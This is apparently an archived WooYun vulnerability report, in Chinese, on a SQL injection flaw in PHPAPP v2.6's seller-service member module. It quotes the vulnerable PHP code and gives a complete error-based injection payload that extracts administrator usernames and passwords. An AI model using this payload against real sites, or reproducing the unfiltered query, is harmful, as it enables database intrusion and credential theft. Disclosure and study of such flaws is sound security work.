{"id": 41530, "wybug_id": "wooyun-2014-088511", "wybug_title": "PHPAPP注入第三枚（无视过滤）", "wybug_corp": "PHPAPP", "wybug_author": "路人甲", "wybug_date": "2014-12-26 13:09", "wybug_open_date": "2015-03-26 13:10", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-26：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  在wooyun上看到了有人提了PHPAPP的漏洞： http://wooyun.org/bugs/wooyun-2010-055604，然后去官网看了看，前几天刚有更新，就在官网下了PHPAPP最新的v2.6来看看(2014-12-11更新的)。PSOT注入点：wwww.xxx.com//member.php?action=7&app=82 , 存在漏洞的文件在/phpapp/apps/sellerservice/member_phpapp.php来看看漏洞是如何产生的/phpapp/apps/sellerservice/member_phpapp.php \nfunction  AddMessageAction(){\t\t\t\t  if($this->POST['Submit']){\t\t\t  \t\t\t\t $uid=$this->uid;\t\t\t\t\t\t\t\t\t\t if($uid>0){\t\t\t\t\t   /*\t\t\t\t\t    $allow=$this->CheckAllow('task_seller_usergroup',array(\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t'messagetask'=>''\t\t\t\t\t\t\t\t\t\t\t\t\t )\t\t\t\t\t\t\t\t\t\t\t );\t\t\t\t\t\t\t*/\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$allow='ok';\t\t\t            if($allow=='ok'){\t\t\t \t\t\t \t\t\t \t\t\t\t\t\t\t\t$this->tid=$this->POST['tid'];\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$strings=new CharFilter($this->POST['content']);\t\t\t\t\t\t\t\tif(empty($this->POST['content'])){\t\t\t\t\t\t\t\t\t echo '请输入留言内容!';\t\t\t\t\t\t\t\t\t echo $this->CloseNowWindows('#loading');\t\t\t\t\t\t\t\t}elseif($strings->CheckLength(5)){ \t\t\t\t\t\t\t\t\t echo '对不起！,留言不能少5个字!';\t\t\t\t\t\t\t\t\t echo $this->CloseNowWindows('#loading');\t\t\t\t\t\t\t\t}else{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //过虑\t\t\t\t\t\t\t\t\t $content=$this->str($this->POST['content'],200,0,1,1,0,1);\t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t\t if($this->tid!=0){\t\t\t\t\t\t\t\t\t\t   \t\t\t\t\t\t\t\t\t\t   $task=$this->GetMysqlOne('seller,uid,subject,process',\" \".$this->GetTable('task').\" WHERE tid='$this->tid'\");\t\t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t\t\t   if($task['process']==6){\t\t\t\t\t\t\t\t\t\t\t   \t\t\t\t\t\t\t\t\t\t\t     echo '该服务已关闭!不能操作<br />';\t\t\t\t\t\t\t\t\t\t\t   \t\t\t\t\t\t\t\t\t\t   }无关代码}\n在把$_POST的值赋$this->POST时，对类似于’string_s’的参数进行了过滤，只要结尾不是’_s’就可以绕过过滤。可以看到：$this->tid=$this->POST['tid'];及 $task=$this->GetMysqlOne('seller,uid,subject,process',\" \".$this->GetTable('task').\" WHERE tid='$this->tid'\");再没有经过任何过滤，造成了注入。Phpapp可以显错，那就用error-based blind进行注入。Pyload：(POST提交)\nSubmit=1&content=123456&tid=2' or (select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(0x23,username,0x23,password) from phpapp_member limit 0,1))a from phpapp_member group by a)b) or'\n注入成功，管理员用户名及密码如下图中所示：\n\n   漏洞证明：  见 详细说明   修复方案：  $this->str()   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}